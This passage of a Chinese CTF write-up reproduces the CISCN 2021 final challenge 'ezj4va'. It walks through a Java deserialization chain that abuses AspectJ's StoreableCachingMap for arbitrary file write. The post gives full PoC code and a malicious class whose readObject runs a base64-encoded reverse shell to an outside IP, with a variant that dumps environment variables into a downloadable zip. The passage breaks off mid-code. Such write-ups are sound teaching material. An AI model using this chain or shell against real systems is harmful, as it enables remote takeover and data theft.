+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902180346201.png" alt="image-20210902180346201"></p>
+<p>直接解码base64 反序列化了</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902180414683.png" alt="image-20210902180414683"></p>
+<p>看下依赖库</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902180436715.png" alt="image-20210902180436715"></p>
+<p>aspectj貌似刚爆出来一个任意文件写入的链子 fastjson也是比较新的</p>
+<p>但是aspectj是依赖CC库的 看下ysoserial就知道</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902181727166.png" alt="image-20210902181727166"></p>
+<p>先把poc给转化出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> MoonBack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/2 18:09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(String name) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Serializable <span class="title">getObject</span><span class="params">(String filename,<span class="keyword">byte</span>[] content)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor ctor = getFirstCtor(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Object simpleCache = ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        Transformer ct = <span class="keyword">new</span> ConstantTransformer(content);</span><br><span class="line">        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, filename);</span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String filename = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.getDecoder().decode(<span class="string">&quot;YWhpaGloaQ==&quot;</span>);</span><br><span class="line">        Serializable obj = getObject(filename,content);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调试一下流程 首先最外层是一个java.util.HashSet#readObject</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902204304926.png" alt="image-20210902204304926"></p>
+<p>调用java.util.HashMap#put方法</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902204410606.png" alt="image-20210902204410606"></p>
+<p>put方法里面调用hash方法 接着调用hashCode方法</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902204519350.png" alt="image-20210902204519350"></p>
+<p>然后就来到了org/apache/commons/collections/keyvalue/TiedMapEntry.java#hashCode</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902204616521.png" alt="image-20210902204616521"></p>
+<p>getValue里就调用了this.map.get()方法 也就是org/apache/commons/collections/map/LazyMap.java#get</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902204642054.png" alt="image-20210902204642054"></p>
+<p>后面就是 一个可控的键值对的put</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902212030077.png" alt="image-20210902212030077"></p>
+<p>后面就是一个写操作了 键就是文件路径 值就是要写入的文件内容</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902212108167.png" alt="image-20210902212108167"></p>
+<p>其实前面饶了一大圈子就是为了构造一个类似与</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.put(key,value);</span><br></pre></td></tr></table></figure>
+
+<p>obj key value均可控</p>
+<p>找了下 在ciscn/fina1/ezj4va/service/impl/CartServiceImpl.java</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902213822265.png" alt="image-20210902213822265"></p>
+<p>最后一处有个put 但是其类型是Map的元素&lt;String,Object&gt;类型 </p>
+<p>发现 我们写文键用到的类也是继承自HashMap</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902220424919.png" alt="image-20210902220424919"></p>
+<p>那这就通了 直接在下载的源码创建poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ciscn.fina1.ezj4va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Serializer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> MoonBack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/2 21:42</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(String name) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getPostObject</span><span class="params">(String filename, <span class="keyword">byte</span>[] content)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cart cart = <span class="keyword">new</span> Cart();</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(filename,content);</span><br><span class="line">        setFieldValue(cart,<span class="string">&quot;skuDescribe&quot;</span>,map);</span><br><span class="line">        <span class="keyword">return</span> cart;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getCookieObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cart cart = <span class="keyword">new</span> Cart();</span><br><span class="line">        Constructor ctor = getFirstCtor(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Object simpleCache = ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        setFieldValue(cart,<span class="string">&quot;skuDescribe&quot;</span>,simpleCache);</span><br><span class="line">        <span class="keyword">return</span> cart;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getTestObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        test t = <span class="keyword">new</span> test();</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String filename = <span class="string">&quot;./../classes/ciscn/fina1/ezj4va/test.class&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQANwoACQAcCQAdAB4IAB8KACAAIQoAIgAjCAAkCgAiACUHACYHACcHACgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGUxjaXNjbi9maW5hMS9lemo0dmEvdGVzdDsBAApFeGNlcHRpb25zBwApAQAKcmVhZE9iamVjdAEAHihMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTspVgEAA29pcwEAG0xqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOwcAKgcAKwEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAsADAcALAwALQAuAQAXU2VyaWFsaXphYmxlIHJlYWRPYmplY3QHAC8MADAAMQcAMgwAMwA0AQBhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TURNdU1UVXlMakV6TWk0eE5pODVNREF3SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQwANQA2AQAXY2lzY24vZmluYTEvZXpqNHZhL3Rlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACQABAAoAAAACAAEACwAMAAIADQAAADMAAQABAAAABSq3AAGxAAAAAgAOAAAACgACAAAADAAEAA4ADwAAAAwAAQAAAAUAEAARAAAAEgAAAAQAAQATAAIAFAAVAAIADQAAAE4AAgACAAAAErIAAhIDtgAEuAAFEga2AAdXsQAAAAIADgAAAA4AAwAAABAACAARABEAEgAPAAAAFgACAAAAEgAQABEAAAAAABIAFgAXAAEAEgAAAAYAAgAYABkAAQAaAAAAAgAb&quot;</span>);</span><br><span class="line">        <span class="comment">// 构造post的cart类</span></span><br><span class="line">        Object post = getPostObject(filename, content);</span><br><span class="line">        String skus = Serializer.serialize(post);</span><br><span class="line">        <span class="comment">// 构造Cookie中cart类</span></span><br><span class="line">        Object cookie = getCookieObject();</span><br><span class="line">        String oldCartStr = Serializer.serialize(cookie);</span><br><span class="line">        String evil = Serializer.serialize(getTestObject());</span><br><span class="line">        System.out.println(<span class="string">&quot;Cookie: cart=&quot;</span>+oldCartStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;POST: skus=&quot;</span>+ java.net.URLEncoder.encode(skus,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;evil class: &quot;</span>+java.net.URLEncoder.encode(evil,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// test unser</span></span><br><span class="line"><span class="comment">//        Cart toAdd =(Cart) Deserializer.deserialize(skus);</span></span><br><span class="line"><span class="comment">//        Cart cart=null;</span></span><br><span class="line"><span class="comment">//        if(oldCartStr!=null)</span></span><br><span class="line"><span class="comment">//            cart= (Cart) Deserializer.deserialize(oldCartStr);</span></span><br><span class="line"><span class="comment">//        if(cart==null)</span></span><br><span class="line"><span class="comment">//            cart=new Cart();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        if(toAdd.getSkuDescribe()!=null)&#123;</span></span><br><span class="line"><span class="comment">//            Map skuDescribe = cart.getSkuDescribe();</span></span><br><span class="line"><span class="comment">//            for(Map.Entry&lt;String,Object&gt; entry:toAdd.getSkuDescribe().entrySet())&#123;</span></span><br><span class="line"><span class="comment">//                skuDescribe.put(entry.getKey(),entry.getValue());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>麻了 刚开始有个变量填错了 一直没成功 日了狗了</p>
+<p>设置值的时候比较好的方式就是使用反射设置值</p>
+<p>再说下如何rce 思路就是写入一个test.class文件 该类重写readObject方法 里面放一些恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ciscn.fina1.ezj4va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> MoonBack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/2 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Serializable readObject&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuMTUyLjEzMi4xNi85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意他启动貌似是在bin目录启动的 需要跳一层目录 正常写入是200</p>
+<p>测了半天没写进去 人麻了</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210903091500502.png" alt="image-20210903091500502"></p>
+<p>反弹shell</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210903091246146.png" alt="image-20210903091246146"></p>
+<p>比赛时 貌似选手靶机和题目是隔离的 替换<a target="_blank" rel="noopener" href="http://www.zip拿flag/">www.zip拿flag</a> </p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210903091951610.png" alt="image-20210903091951610"></p>
+<p>上面的test类修改为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ciscn.fina1.ezj4va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> MoonBack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/2 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Serializable readObject&quot;</span>);</span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuMTUyLjEzMi4xNi85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,ZW52ID4gLi4vY2xhc3Nlcy93d3cuemlw&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc修改为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ciscn.fina1.ezj4va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;</span><br><span class="line"><span class="keyword">import</span> ciscn.fina1.ezj4va.utils.Serializer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> MoonBack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/2 21:42</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(String name) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> 